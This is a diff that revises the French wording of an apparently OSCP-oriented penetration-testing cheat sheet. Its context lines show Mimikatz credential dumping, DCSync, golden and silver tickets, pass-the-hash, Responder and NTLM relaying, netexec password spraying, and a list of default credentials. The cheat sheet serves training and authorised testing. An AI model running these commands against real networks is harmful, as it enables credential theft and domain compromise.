@@ -50,7 +50,7 @@ hydra -P <password_list> redis://<target_ip>
 ```
 
 
-## Pulvérisation du mot de passe
+## Pulvérisation de mots de passe (Password Spraying)
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
@@ -222,7 +222,7 @@ hydra -l <username> -P <wordlist> <target_ip> http-get /
 ```
 
 
-## Estimer le temps de calcul
+## Estimer le temps de cassage d’un mot de passe
 
 
 <p class="oscp-command-note">Afficher ou écrire une valeur.</p>
@@ -242,7 +242,7 @@ python3 -c "print(<keyspace> / <hash_rate>)"
 <p class="oscp-command-note">Script shell dans la rubrique « Estimer le temps de calcul ».</p>
 
 ```bash
-# Estimation du temps de fissuration pour un mot de passe alphanumérique à 5 caractères
+# Estimation du temps de cassage d’un mot de passe alphanumérique de 5 caractères
 characters="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 
 echo -n $characters | wc -c  # keyspace
@@ -252,7 +252,7 @@ python3 -c "print(62**5 / 1000000000)"  # example for 1B hashes per second
 ```
 
 
-## Mutating Listes de mots
+## Modification de listes de mots (Wordlists)
 
 
 <p class="oscp-command-note">Analyser des empreintes avec Hashcat.</p>
@@ -548,28 +548,28 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 `privilege::debug` · `token::elevate`  
 
 
-**Élévation de privilèges to SYSTEM**
+**Élévation de privilèges vers SYSTEM**
 
 
 **Paramètres et repères :**
 `lsadump::sam`  
 
 
-**Dumping Password Hashes de SAM**
+**Extraction des empreintes de la SAM**
 
 
 **Paramètres et repères :**
 `lsadump::secrets`  
 
 
-**Pouvoirs de dumping de LSA Secrets**
+**Extraction des secrets LSA**
 
 
 **Paramètres et repères :**
 `lsadump::cache`  
 
 
-**Dumping Domain Cached Credentials (DCC)**
+**Extraction des identifiants de domaine en cache (DCC)**
 
 
 **Paramètres et repères :**
@@ -583,10 +583,10 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 `sekurlsa::tickets`  
 
 
-**Dumping Kerberos Tickets**
+**Extraction des tickets Kerberos**
 
 
-**Extraits des lettres de créances de LSA**
+**Extraction des secrets LSA**
 
 
 
@@ -601,52 +601,52 @@ lsadump::lsa /inject
 `sekurlsa::wdigest`  
 
 
-**Dumping WDIGEST Credentials**
+**Extraction des identifiants WDigest**
 
 
 **Paramètres et repères :**
 `sekurlsa::logonpasswords`  
 
 
-**Dumping Clear-Text Credentials**
+**Extraction des identifiants en clair**
 
 
 **Paramètres et repères :**
 `sekurlsa::msv`  
 
 
-**Dumping NTLM Hashes from LSASS Memory**
+**Extraction des hashes NTLM depuis la mémoire LSASS**
 
 
 **Paramètres et repères :**
 `sekurlsa::kerberos`  
 
 
-**Dumping Kerberos Keys**
+**Extraction des clés Kerberos**
 
 
 **Paramètres et repères :**
 `sekurlsa::ssp`  
 
 
-**Dumping SSP Credentials**
+**Extraction des identifiants SSP**
 
 
 **Paramètres et repères :**
 `sekurlsa::tspkg`  
 
 
-**Dumping TSPKG Credentials**
+**Extraction des identifiants TSPKG**
 
 
 **Paramètres et repères :**
 `privilege::list`  
 
 
-**Listing Available Privileges**
+**Afficher les privilèges disponibles**
 
 
-**Extracts Passwords from Windows Vault**
+**Extraction des mots de passe du coffre Windows (Windows Vault)**
 
 
 
@@ -657,7 +657,7 @@ vault::cred /patch
 ```
 
 
-**Dumping Security Account Manager (SAM)**
+**Extraction de la base SAM (Security Account Manager)**
 
 
 
@@ -668,7 +668,7 @@ lsadump::sam /system:<SYSTEM> /sam:<SAM>
 ```
 
 
-**Dumping de hashes de Active Directory**
+**Extraction des hashes Active Directory**
 
 
 
@@ -684,7 +684,7 @@ lsadump::dcsync /domain:<DOMAIN> /user:<USERNAME>
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 
-**Pass-the-Hash Attack (PTH)**
+**Réutilisation d’un hash (Pass-the-Hash, PtH)**
 
 
 
@@ -695,7 +695,7 @@ sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:<COMMAND>
 ```
 
 
-**Pass-the-Ticket Attack (PTT)**
+**Réutilisation d’un ticket Kerberos (Pass-the-Ticket, PtT)**
 
 
 
@@ -706,7 +706,7 @@ kerberos::ptt <ticket.kirbi>
 ```
 
 
-**Hors-pass-The-Hash / Pass-The-Key (Billet Kerberos)**
+**Obtention de tickets via un hash ou une clé (Overpass-the-Hash / Pass-the-Key)**
 
 
 
@@ -717,7 +717,7 @@ sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /aes128:<AES128_HASH> /aes256:<A
 ```
 
 
-**Golden Ticket Creation**
+**Création d’un Golden Ticket (faux TGT)**
 
 
 
@@ -728,7 +728,7 @@ kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KR
 ```
 
 
-**Silver Ticket Creation**
+**Création d’un Silver Ticket (faux ticket de service)**
 
 
 
@@ -739,7 +739,7 @@ kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<SE
 ```
 
 
-**Dump Kerberos Tickets pour un utilisateur spécifique**
+**Extraction des tickets Kerberos d’un utilisateur précis**
 
 
 
@@ -754,10 +754,10 @@ sekurlsa::tickets /export
 `misc::skeleton` · `mimikatz`  
 
 
-**Skeleton Key Injection**
+**Injection d’une Skeleton Key**
 
 
-**Kerberos Silver Ticket Creation (Avancé)**
+**Création avancée d’un Silver Ticket Kerberos**
 
 
 
@@ -768,7 +768,7 @@ kerberos::silver /user:<USERNAME> /domain:<DOMAIN> /target:<SERVER> /rc4:<NTLM_H
 ```
 
 
-**Surpasser-le-Hash (avec RC4)**
+**Overpass-the-Hash avec une clé RC4**
 
 
 
@@ -779,7 +779,7 @@ sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /rc4:<NTLM_HASH> /run:<COMMAND>
 ```
 
 
-**DPAPI Credential Decryption**
+**Déchiffrement des identifiants protégés par DPAPI**
 
 
 
@@ -794,10 +794,10 @@ dpapi::cred /in:<CREDENTIAL_FILE>
 `kerberos::tgt`  
 
 
-**Extracting TGT from LSASS Memory**
+**Extraction d’un TGT depuis la mémoire LSASS**
 
 
-### Mimikatz One-Liners
+### Commandes Mimikatz en une ligne (One-liners)
 
 
 **Paramètres et repères :**
@@ -826,7 +826,7 @@ mimikatz.exe "privilege::debug" "[command]" "exit" > C:\temp\mimikatz_output.txt
 ```
 
 
-<p class="oscp-command-note">Script PowerShell dans la rubrique « Mimikatz One-Liners ».</p>
+<p class="oscp-command-note">Script PowerShell pour exécuter Mimikatz en une ligne.</p>
 
 ```powershell
 $command = "privilege::debug [command] exit"
@@ -920,7 +920,7 @@ impacket-smbclient -hashes <LM_HASH>:<NTLM_HASH> <USERNAME>@<TARGET_IP>
 ```
 
 
-## Pass-The-Hash NTLM
+## Réutilisation d’un hash NTLM (Pass-the-Hash)
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
@@ -997,7 +997,7 @@ sudo responder -I <interface>
 ```
 
 
-<p class="oscp-command-note">Script PowerShell dans la rubrique « Cracking Net-NTLMv2 ».</p>
+<p class="oscp-command-note">Script PowerShell pour analyser les empreintes Net-NTLMv2.</p>
 
 ```powershell
 C:\Windows\system32> dir \\<responder_ip>\test
@@ -1033,7 +1033,7 @@ hashcat (v6.2.5) starting
 ```
 
 
-## Relaying Net-NTLMv2
+## Relais d’authentification Net-NTLMv2 (NTLM Relay)
 
 
 **Paramètres et repères :**
@@ -1096,12 +1096,12 @@ C:\Windows\system32> dir \\<responder_ip>\test
 ```
 
 
-## Pouvoirs par défaut
+## Identifiants par défaut (Default Credentials)
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 
-### Database Tool
+### Outil de référence des identifiants par défaut
 
 
 <p class="oscp-command-note">Gérer les modules Python.</p>
@@ -1145,7 +1145,7 @@ creds update
 # Recherche de produits creds
 creds search [service/web_server/term] --proxy=http://localhost:8080
 
-# update records
+# Mettre à jour les enregistrements
 creds update --proxy=http://localhost:8080
 
 # Exemple : Rechercher des creds Tomcat et les résultats d'exportation vers /tmp/tomcat-usernames.txt , /tmp/tomcat-passwords.txt
@@ -1162,32 +1162,32 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 
 ```text
-# Titres de créance généralement devinés ou par défaut
-root:root                # Default root credentials
-admin@example.com:admin  # Common admin credentials for email accounts
-admin:admin              # Standard admin/admin credentials
-USERK:USERK              # Credentials matching the box name (e.g., a target machine's name)
-cassie:cassie            # Credentials found using exiftool or similar methods
+# Identifiants courants ou définis par défaut
+root:root                # Identifiants root par défaut
+admin@example.com:admin  # Identifiants administrateur courants pour des comptes de messagerie
+admin:admin              # Identifiants classiques admin/admin
+USERK:USERK              # Identifiants correspondant au nom de la machine cible
+cassie:cassie            # Identifiants retrouvés avec ExifTool ou un outil similaire
 
-# Pouvoirs additionnels par défaut
-admin:password           # Standard admin/password credentials
-admin:1234               # Admin credentials with simple numeric password
-administrator:admin      # Default admin credentials for Windows systems
-admin:admin123           # Common admin credentials with variations
-guest:guest              # Default guest credentials for various systems
-user:user                # Basic user credentials
-test:test                # Test account credentials
-support:support          # Default support account credentials
-manager:manager          # Common manager credentials
-operator:operator        # Default operator credentials
-service:service          # Default service account credentials
-postgres:postgres        # Default PostgreSQL credentials
-mysql:mysql              # Default MySQL credentials
+# Autres identifiants par défaut
+admin:password           # Identifiants courants admin/password
+admin:1234               # Identifiants admin avec mot de passe numérique simple
+administrator:admin      # Identifiants administrateur Windows courants
+admin:admin123           # Variantes courantes du compte admin
+guest:guest              # Identifiants du compte invité par défaut
+user:user                # Identifiants utilisateur simples
+test:test                # Identifiants du compte de test
+support:support          # Identifiants du compte support par défaut
+manager:manager          # Identifiants manager courants
+operator:operator        # Identifiants du compte opérateur par défaut
+service:service          # Identifiants du compte de service par défaut
+postgres:postgres        # Identifiants PostgreSQL par défaut
+mysql:mysql              # Identifiants MySQL par défaut
 
 ```
 
 
-### Stratégies pour une interprétation efficace du mot de passe
+### Stratégies de cassage des mots de passe
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
@@ -1196,7 +1196,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 `USERK:USERK` · `exiftool`  
 
 
-## Recommended Listes de mots
+## Listes de mots recommandées (Wordlists)
 
 
 **Paramètres et repères :**
@@ -1272,7 +1272,7 @@ netexec smb target -u '' -p '' --rid-brute --rid-range 500-1100
 ```
 
 
-### Spraying
+### Pulvérisation de mots de passe (Password Spraying)
 
 
 **FTP**
@@ -1532,7 +1532,7 @@ netexec mssql target -u [username] -p [password] --get-file output_file target_f
 ```
 
 
-### Secrets Dump
+### Extraction de secrets avec SecretsDump
 
 
 <p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
@@ -1721,7 +1721,7 @@ netexec ldap [target] -u [username] -p [password] -M ldap-checker
 ```
 
 
-#### Vérifiez si le DC est vulnérable à zérologon, petitpotam, nopac
+#### Vérifier les vulnérabilités Zerologon, PetitPotam et noPac du contrôleur de domaine
 
 
 <p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
@@ -1736,7 +1736,7 @@ netexec smb [target] -u [username] -p [password] -M nopac
 ```
 
 
-#### Vérifiez la machineAccountQuota
+#### Vérifier l’attribut MachineAccountQuota
 
 
 <p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
@@ -1747,7 +1747,7 @@ netexec ldap [target] -u [username] -p [password] -M maq
 ```
 
 
-#### ADCS Énumération
+#### Énumération des services de certificats AD (AD CS)
 
 
 <p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
@@ -1758,7 +1758,7 @@ netexec ldap [target] -u [username] -p [password] -M adcs
 ```
 
 
-#### Récupération MSOL Mot de passe du compte
+#### Récupération du mot de passe du compte MSOL
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
@@ -1812,7 +1812,7 @@ impacket-ntlmrelayx -tf relay.txt -smb2support
 ```
 
 
-### Impersonate logged-on Users
+### Usurpation de l’identité des utilisateurs connectés (Impersonation)
 
 
 <p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
@@ -1833,7 +1833,7 @@ nxc smb [target] -u [localAdmin] -p [password] -M schtask_as -o USER=[logged-on-
 ![Impersonate Logged In Users with NetExec.](https://www.emmanuelsolis.com/img/netexec_01.png)
 
 
-### Multi-Domain Environment
+### Environnement multidomaine
 
 Examiner les objets, les droits et les services du domaine.
 
@@ -1873,7 +1873,7 @@ python3 script.py -u [users_list].txt -d [domains_list].txt
 ```
 
 
-<p class="oscp-command-note">Script Python lié à « Multi-Domain Environment ».</p>
+<p class="oscp-command-note">Script Python pour créer des combinaisons domaine-utilisateur.</p>
 
 ```python
 import argparse
@@ -1897,7 +1897,7 @@ def main():
         print(f"Error: {e}")
         return
 
-    # Generate combinations
+    # Générer les combinaisons
     combinations = [f"{domain}\\{user}" for user in users for domain in domains]
 
     # Écrivez les combinaisons dans le fichier de sortie
